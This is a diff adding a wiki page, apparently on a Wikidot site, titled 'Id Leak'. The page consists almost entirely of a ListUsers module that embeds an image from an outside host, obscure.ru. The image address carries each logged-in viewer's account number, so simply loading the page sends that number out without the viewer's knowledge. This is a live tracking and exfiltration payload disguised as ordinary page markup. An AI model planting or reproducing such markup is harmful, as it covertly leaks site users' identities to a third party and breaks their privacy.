@@ -1,0 +1,16 @@
+---
+title: "Id Leak"
+tags: []
+page_id: "1084121470"
+site: "obscurative"
+slug: "id-leak"
+revision: 4
+revision_id: "1133731849"
+author: 4518363
+timestamp: 1590390586
+---
+
+[[module ListUsers users="."]]
+[[image http://obscure.ru:8000/id-leak/%%number%%]]
+[[/module]]
+
